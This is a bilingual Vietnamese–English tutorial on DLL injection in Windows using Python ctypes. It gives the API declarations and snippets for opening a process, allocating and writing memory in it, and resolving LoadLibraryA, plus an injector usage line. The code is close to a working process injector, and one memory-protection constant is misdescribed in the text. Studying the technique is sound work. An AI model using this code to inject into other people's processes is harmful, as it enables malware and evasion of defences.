# DLL INJECTION
### Các bước tiến hành DLL Injection - Steps to perform DLL Injection
   - Tấn công tiến trình - Attach to the process 
   - Phân bổ bộ nhớ chứa tiến trình - Allocate memory within the process
   - Chép đường dẫn DLL vào bộ nhớ tiến trình - Copy the DLL path into process memory    - Tạo luồng với tiến trình để thực thi DLL - Create a thread within the process to execute your DLL
### Danh sách API sử dụng - List APIs
- OpenProcess()
- VirtualAllocEx()
- WriteProcessMemory()
- LoadLibraryA()
- CreateRemoteThread(), NtCreateThreadEx, etc.
### Win32 API
- Tạo cách định nghĩa cho hàm muốn gọi 
We’ll create definitions for the functions we want to call.

```
kernel32 = ctypes.windll.kernel32

LPCTSTR = ctypes.c_char_p 
SIZE_T = ctypes.c_size_t

OpenProcess = kernel32.OpenProcess
OpenProcess.argtypes = (ctypes.wintypes.DWORD, ctypes.wintypes.BOOL, ctypes.wintypes.DWORD)
OpenProcess.restype = ctypes.wintypes.HANDLE

VirtualAllocEx = kernel32.VirtualAllocEx
VirtualAllocEx.argtypes = (ctypes.wintypes.HANDLE, ctypes.wintypes.LPVOID, SIZE_T, ctypes.wintypes.DWORD, ctypes.wintypes.DWORD)
VirtualAllocEx.restype = ctypes.wintypes.LPVOID

WriteProcessMemory = kernel32.WriteProcessMemory
WriteProcessMemory.argtypes = (ctypes.wintypes.HANDLE, ctypes.wintypes.LPVOID, ctypes.wintypes.LPCVOID, SIZE_T, ctypes.POINTER(SIZE_T))
WriteProcessMemory.restype = ctypes.wintypes.BOOL

GetModuleHandle = kernel32.GetModuleHandleA
GetModuleHandle.argtypes = (LPCTSTR, )
GetModuleHandle.restype = ctypes.wintypes.HANDLE

GetProcAddress = kernel32.GetProcAddress
GetProcAddress.argtypes = (ctypes.wintypes.HANDLE, LPCTSTR)
GetProcAddress.restype = ctypes.wintypes.LPVOID

class _SECURITY_ATTRIBUTES(ctypes.Structure):
    _fields_ = [('nLength', ctypes.wintypes.DWORD),
                ('lpSecurityDescriptor', ctypes.wintypes.LPVOID),
                ('bInheritHandle', ctypes.wintypes.BOOL)]

SECURITY_ATTRIBUTES = _SECURITY_ATTRIBUTES
LPSECURITY_ATTRIBUTES = ctypes.POINTER(_SECURITY_ATTRIBUTES)
LPTHREAD_START_ROUTINE = ctypes.wintypes.LPVOID


CreateRemoteThread = kernel32.CreateRemoteThread
CreateRemoteThread.argtypes = (ctypes.wintypes.HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, ctypes.wintypes.LPVOID, ctypes.wintypes.DWORD, ctypes.wintypes.LPDWORD)
CreateRemoteThread.restype = ctypes.wintypes.HANDLE

MEM_COMMIT = 0x0001000
MEM_RESERVE = 0x00002000
PAGE_READWRITE = 0x04
EXECUTE_IMMEDIATELY = 0x0
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0x00000FFF)
```
### OpenProcess()
- Sử dụng OpenProcess để trả về 1 handle để xử lí tiến trình chúng ta cần tương tác
We will use OpenProcess() to return a handle to the process so we can interact with it
```
handle = OpenProcess(PROCESS_ALL_ACCESS, False, pid)
```
- OpenProcess() có 3 tham số - OpenProcess() takes three arguments.
    - dwDesiredAccess - Đây là quyền truy cập vào tiến trình. Để sử dụng WriteProcessMemory, handle phải có quyền PROCESS_VM_WRITE và PROCESS_VM_OPERATION vào tiến trình.
 (This is the access rights to the process. In order to use WriteProcessMemory, the handle must have PROCESS_VM_WRITE and PROCESS_VM_OPERATION access to the process.)
    - bInheritHandle -Nếu giá trị này là TRUE, thì tiến trình được tạo bởi quá trình này cũng sẽ kế thừa handle. Chúng ta không cần điều này vì vậy chúng ta đặt nó thành FALSE. 
    (If this value is TRUE, then the process created by this process will also inherit the handle. We don’t need this so we set it to false.)
   - dwProcessID - Đây là id của tiến trình 
   This is the process id of the process to be opened.
### VirtualAllocEx()
- VirtualAllocEx() lấy dung lượng bộ nhớ để phân bổ làm một trong các tham số của nó.
```
memory = VirtualAllocEx(handle, False, len(dllname) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRIT
E)
```

- VirtualAllocEx() có 5  tham số - VirtualAllocEx()takes five arguments.
     - hProcess - Đây là handle tiến trình. Hàm này sẽ phân bổ bộ nhớ trong không gian địa chỉ ảo của tiến trình.
     This is the handle to the process. The function will allocate memory within the virtual address space of this process.
    - lpAddress - Đây là một con trỏ tới địa chỉ bắt đầu của vùng trang bạn muốn phân bổ. Nếu là NULL, hàm sẽ xác định vị trí cấp phát vùng.
    This is a pointer to the starting address of the region of pages you want to allocate. If this is NULL, the function will determine where to allocate the region.
    - dwSize - Đây là kích thước của vùng bộ nhớ để phân bổ, tính bằng byte. Chúng ta sẽ phân bổ không gian cho đường dẫn đầy đủ của DLL.
    This is the size of the region of memory to allocate, in bytes. We will allocate space for the full path of the DLL.
    - flAllocationType and flProtect - cho biết loại phân bổ và bảo vệ bộ nhớ, chúng ta dùng 0x3000 cho loại phân bổ sẽ gọi VirtualAllocEx với MEM_RESERVE và MEM_COMMIT. 0x40 chỉ ra rằng bộ nhớ có thể đọc và ghi được.
    This indicates the allocation type and memory protection. We will use 0x3000 for the allocation type which will call VirtualAllocEx with MEM_RESERVE and MEM_COMMIT. 0x40 indicates that the memory is readable and writable.
### WriteProcessMemory()
Chép đường dẫn DLL vào tiến trình. 
Now we will copy the DLL path into the process. We can use WriteProcessMemory to do so.
```
write = WriteProcessMemory(handle, memory, dllname, len(dllname) + 1, None)
```
### LoadLibraryA() và CreateRemoteThread() 
- Tới đây chúng ta có DLL đã viết vào tiến trình đích, chúng ta bắt đầu một luồng mới để thực thi file DLL
Now that we have our DLL written to the remote process, we can start a new thread to load our DLL. 
- Đầu tiên cần xác định vị trí của LoadLibrary(). Để làm được chúng ta cần GetProcAddress và GetModuleHandle.
First,we need to find the location of LoadLibrary(). To do so, we’ll use GetProcAddress and GetModuleHandle.
- GetProcAddress sẽ truy xuất địa chỉ của hàm hoặc biến đã xuất từ tệp DLL.
GetProcAddress will retrieve the address of an exported function or variable from a DLL. 
- GetModuleHandle sẽ truy xuất handle module tới module đã chỉ định 
GetModuleHandle to retrieve a module handle to a specified module.
```
load_lib = GetProcAddress(GetModuleHandle(b"kernel32.dll"), b"LoadLibraryA")
```
- Chúng ta đã có địa chỉ load library. Việc cần làm tiếp theo là tạo một luồng tới DLL đã tải lên. 
We have the load library address now, all we need to do is to create a thread to execute the loaded DLL.

./dll_injec.py -p <PID> -f <PATH_TO_DLL>
